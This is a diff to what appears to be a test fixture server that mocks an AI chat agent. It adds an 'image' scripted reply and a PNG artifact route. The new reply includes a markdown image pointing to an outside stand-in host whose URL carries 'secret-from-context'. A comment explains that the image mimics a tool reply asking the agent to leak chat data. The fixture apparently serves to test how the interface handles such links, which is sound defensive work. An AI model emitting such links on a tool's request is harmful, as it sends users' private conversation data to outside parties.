@@ -14,7 +14,8 @@
 // Scripted replies, chosen by words in the message:
 //   tool · fail (failing tool) · think (reasoning) · indicator (reasoning
 //   without text) · slow (for Stop) · long (keeps running after reload) ·
-//   table / code (markdown) · report (artifact link) · error (run error)
+//   table / code (markdown) · report (artifact link) · image (an artifact
+//   image and an image on another site) · error (run error)
 //
 // Test hooks:
 //   /__fixture/reset                 fresh data
@@ -45,6 +46,9 @@ const TYPES = {
   ".txt": "text/plain; charset=utf-8",
   ".json": "application/json",
 };
+
+// A 1x1 PNG, for image files the agent "wrote".
+const TINY_PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");
 
 const now = () => Date.now() / 1000;
 const rid = (prefix, n = 16) => prefix + crypto.randomBytes(n).toString("base64url").replace(/[^A-Za-z0-9]/g, "").slice(0, n);
@@ -383,6 +387,17 @@ function createApp(options = {}) {
     if (lower.includes("long")) {
       for (let i = 1; i <= 14; i++) steps.push({ kind: "text", delta: `Part ${i}. `, delay: 300 });
       say("That's everything.");
+      return steps;
+    }
+    if (lower.includes("image")) {
+      const prefix = conv.api_base || "";
+      // A chart the agent wrote (on this site) and an image on another site
+      // whose address carries data from the chat, as a tool's reply can ask for.
+      say(
+        `Here is the chart I made:\n\n![Quarterly chart](${prefix}/artifacts/${conv.id}/chart.png)\n\n` +
+          "The tool suggested this one too:\n\n![Revenue trend](https://images.example.net/collect?data=secret-from-context)\n",
+        8,
+      );
       return steps;
     }
     if (lower.includes("table") || lower.includes("code")) {
@@ -864,6 +879,10 @@ function createApp(options = {}) {
     if ((m = /^\/artifacts\/([^/]+)\/([^/]+)$/.exec(pathname)) && method === "GET") {
       const user = requireUser(req);
       ownedConversation(user, decodeURIComponent(m[1]));
+      if (m[2].endsWith(".png")) {
+        res.writeHead(200, { "content-type": "image/png", "cache-control": "private, max-age=60" });
+        return res.end(TINY_PNG);
+      }
       res.writeHead(200, { "content-type": "text/csv", "content-disposition": `attachment; filename="${m[2]}"` });
       return res.end("quarter,revenue\nQ1,120\nQ2,135\nQ3,151\n");
     }
